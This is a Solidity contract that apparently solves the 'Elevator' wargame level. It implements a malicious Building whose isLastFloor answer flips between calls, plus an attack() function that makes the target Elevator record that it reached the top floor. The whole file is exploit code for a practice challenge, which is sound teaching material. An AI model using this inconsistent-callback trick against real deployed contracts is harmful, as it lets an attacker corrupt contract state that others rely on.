pragma solidity ^0.6.0;

interface Elevator{
    function goTo(uint _floor) external;
}

contract Building {

    Elevator elevatorImpl;
    bool isTop;

    constructor(address addr) public {
        elevatorImpl = Elevator(addr);
        isTop = false;
    }

    function flip() public {
        isTop = !isTop;
    }

    function isLastFloor(uint) public returns (bool){
        bool res = isTop;
        flip();
        return res;
    }
    
    function attack() public {
        elevatorImpl.goTo(1);
    }
}
